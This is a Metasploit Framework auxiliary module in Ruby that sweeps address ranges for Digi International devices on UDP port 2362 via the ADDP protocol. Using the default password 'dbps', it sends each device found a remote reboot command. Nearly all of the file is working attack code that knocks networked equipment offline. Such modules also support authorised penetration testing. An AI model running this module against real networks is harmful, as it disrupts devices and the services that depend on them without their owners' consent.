##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/addp'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::UDPScanner

	def initialize
		super(
			'Name'        => 'Digi ADDP Remote Reboot Initiator',
			'Description' => 'Reboot Digi International based equipment through the ADDP service',
			'Author'      => 'hdm',
			'References'  =>
				[
					['URL', 'http://qbeukes.blogspot.com/2009/11/advanced-digi-discovery-protocol_21.html'],
					['URL', 'http://www.digi.com/wiki/developer/index.php/Advanced_Device_Discovery_Protocol_%28ADDP%29'],
				],
			'License'     => MSF_LICENSE
		)

		register_options(
		[
			Opt::RPORT(2362),
			OptString.new('ADDP_PASSWORD', [true, 'The ADDP protocol password for each target', 'dbps'])
		], self.class)
	end

	def scanner_prescan(batch)
		print_status("Finding ADDP nodes within #{batch[0]}->#{batch[-1]} (#{batch.length} hosts)")
		@results = {}
	end

	def scan_host(ip)
		Rex::Proto::ADDP.request_config_all.each do |pkt|
			scanner_send(pkt, ip, datastore['RPORT'])
		end
	end

	def scanner_postscan(batch)
		queue = {}
		@results.each_pair do |ip,res|
			queue[ip] = res
		end

		@results = {}

		queue.each_pair do |ip, res|
			info = Rex::Proto::ADDP.reply_to_string(res)
			print_status("#{ip}:#{datastore['RPORT']} Sending reboot request to device with MAC #{res[:mac]}...")
			pkt = Rex::Proto::ADDP.request_reboot(res[:magic], res[:mac], datastore['ADDP_PASSWORD'])
			scanner_send(pkt, ip, datastore['RPORT'])
		end

		# Wait for the final replies to trickle in
		scanner_recv(10) if queue.length > 0
	end

	def scanner_process(data, shost, sport)
		@results[shost] ||= {}
		@results[shost] = Rex::Proto::ADDP.decode_reply(data)

		if @results[shost][:cmd] == Rex::Proto::ADDP::CMD_REBOOT_REP
			print_status("#{shost}:#{sport} Reboot Status: " + Rex::Proto::ADDP.reply_to_string(@results[shost]))
		end
	end

end
